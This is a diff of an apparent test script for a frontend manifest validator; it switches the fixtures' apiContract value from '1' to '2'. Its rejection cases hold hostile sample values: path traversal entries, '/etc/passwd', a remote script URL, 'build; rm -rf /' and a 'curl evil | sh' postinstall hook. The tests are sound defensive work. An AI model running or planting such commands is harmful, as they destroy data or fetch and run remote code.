@@ -49,7 +49,7 @@ manifest = {
     "id": fid,
     "name": f"{fid} test frontend",
     "version": version,
-    "compatibility": {"frontendRuntime": "1", "apiContract": "1"},
+    "compatibility": {"frontendRuntime": "1", "apiContract": "2"},
     "entry": "assets/app.js",
     "styles": ["assets/app.css"],
 }
@@ -72,7 +72,7 @@ manifest = {
     "id": fid,
     "name": f"{fid} source frontend",
     "version": version,
-    "compatibility": {"frontendRuntime": "1", "apiContract": "1"},
+    "compatibility": {"frontendRuntime": "1", "apiContract": "2"},
     "entry": "assets/app.js",
     "styles": ["assets/app.css"],
 }
@@ -94,7 +94,7 @@ open(path, "w", encoding="utf-8").write(json.dumps({
     "id": fid,
     "name": f"{fid} source frontend",
     "version": version,
-    "compatibility": {"frontendRuntime": "1", "apiContract": "1"},
+    "compatibility": {"frontendRuntime": "1", "apiContract": "2"},
     "entry": "assets/app.js",
     "styles": ["assets/app.css"],
 }, indent=2) + "\n")
@@ -130,29 +130,29 @@ V="$WORK/manifest-cases"
 mkdir -p "$V"
 mk() { printf '%s' "$2" >"$V/$1.json"; }
 
-mk good '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","styles":["assets/app.css"]}'
-mk bad-unknown '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","source":"/home/me/x"}'
-mk bad-schema '{"schemaVersion":2,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js"}'
-mk bad-id '{"schemaVersion":1,"id":"../evil","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js"}'
-mk bad-semver '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js"}'
-mk bad-name '{"schemaVersion":1,"id":"demo","name":"","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js"}'
+mk good '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","styles":["assets/app.css"]}'
+mk bad-unknown '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","source":"/home/me/x"}'
+mk bad-schema '{"schemaVersion":2,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js"}'
+mk bad-id '{"schemaVersion":1,"id":"../evil","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js"}'
+mk bad-semver '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js"}'
+mk bad-name '{"schemaVersion":1,"id":"demo","name":"","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js"}'
 mk bad-name-long "{\"schemaVersion\":1,\"id\":\"demo\",\"name\":\"$(printf 'x%.0s' $(seq 1 129))\",\"version\":\"1.0.0\",\"compatibility\":{\"frontendRuntime\":\"1\",\"apiContract\":\"1\"},\"entry\":\"assets/app.js\"}"
 mk bad-desc-long "{\"schemaVersion\":1,\"id\":\"demo\",\"name\":\"Demo\",\"version\":\"1.0.0\",\"description\":\"$(printf 'x%.0s' $(seq 1 1025))\",\"compatibility\":{\"frontendRuntime\":\"1\",\"apiContract\":\"1\"},\"entry\":\"assets/app.js\"}"
 mk bad-author-long "{\"schemaVersion\":1,\"id\":\"demo\",\"name\":\"Demo\",\"version\":\"1.0.0\",\"author\":\"$(printf 'x%.0s' $(seq 1 257))\",\"compatibility\":{\"frontendRuntime\":\"1\",\"apiContract\":\"1\"},\"entry\":\"assets/app.js\"}"
-mk bad-compat-key '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1","buildHost":"ci"},"entry":"assets/app.js"}'
-mk bad-runtime '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"9","apiContract":"1"},"entry":"assets/app.js"}'
+mk bad-compat-key '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2","buildHost":"ci"},"entry":"assets/app.js"}'
+mk bad-runtime '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"9","apiContract":"2"},"entry":"assets/app.js"}'
 mk bad-api '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"9"},"entry":"assets/app.js"}'
-mk bad-sdk-type '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1","sdk":1},"entry":"assets/app.js"}'
-mk bad-entry-abs '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"/etc/passwd"}'
-mk bad-entry-traversal '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"../../evil.js"}'
-mk bad-entry-scheme '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"https://evil.example/x.js"}'
-mk bad-styles-type '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","styles":"assets/app.css"}'
-mk bad-style-path '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","styles":["../x.css"]}'
-mk bad-build-in-artifact '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"script":"build"}}'
+mk bad-sdk-type '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2","sdk":1},"entry":"assets/app.js"}'
+mk bad-entry-abs '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"/etc/passwd"}'
+mk bad-entry-traversal '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"../../evil.js"}'
+mk bad-entry-scheme '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"https://evil.example/x.js"}'
+mk bad-styles-type '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","styles":"assets/app.css"}'
+mk bad-style-path '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","styles":["../x.css"]}'
+mk bad-build-in-artifact '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","build":{"script":"build"}}'
 python3 - "$V/bad-styles-many.json" <<'PY'
 import json, sys
 json.dump({"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0",
-           "compatibility":{"frontendRuntime":"1","apiContract":"1"},
+           "compatibility":{"frontendRuntime":"1","apiContract":"2"},
            "entry":"assets/app.js","styles":[f"s{i}.css" for i in range(17)]},
           open(sys.argv[1], "w"))
 PY
@@ -171,11 +171,11 @@ echo "== 2. 源码 manifest 的 build 契约 =="
 S="$WORK/source-cases"
 mkdir -p "$S"
 mks() { printf '%s' "$2" >"$S/$1.json"; }
-mks good-build '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"packageManager":"pnpm","script":"build:floatctf","outputDir":"out-ui"}}'
-mks bad-pm '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"packageManager":"bun"}}'
-mks bad-script '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"script":"build; rm -rf /"}}'
-mks bad-outdir '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"outputDir":"../../etc"}}'
-mks bad-build-key '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"1"},"entry":"assets/app.js","build":{"postinstall":"curl evil | sh"}}'
+mks good-build '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","build":{"packageManager":"pnpm","script":"build:floatctf","outputDir":"out-ui"}}'
+mks bad-pm '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","build":{"packageManager":"bun"}}'
+mks bad-script '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","build":{"script":"build; rm -rf /"}}'
+mks bad-outdir '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","build":{"outputDir":"../../etc"}}'
+mks bad-build-key '{"schemaVersion":1,"id":"demo","name":"Demo","version":"1.0.0","compatibility":{"frontendRuntime":"1","apiContract":"2"},"entry":"assets/app.js","build":{"postinstall":"curl evil | sh"}}'
 expect_ok "source/build 合法" fe _manifest-validate-json "$S/good-build.json" true
 expect_fail "source/build packageManager 非法" fe _manifest-validate-json "$S/bad-pm.json" true
 expect_fail "source/build script 含 shell 注入" fe _manifest-validate-json "$S/bad-script.json" true
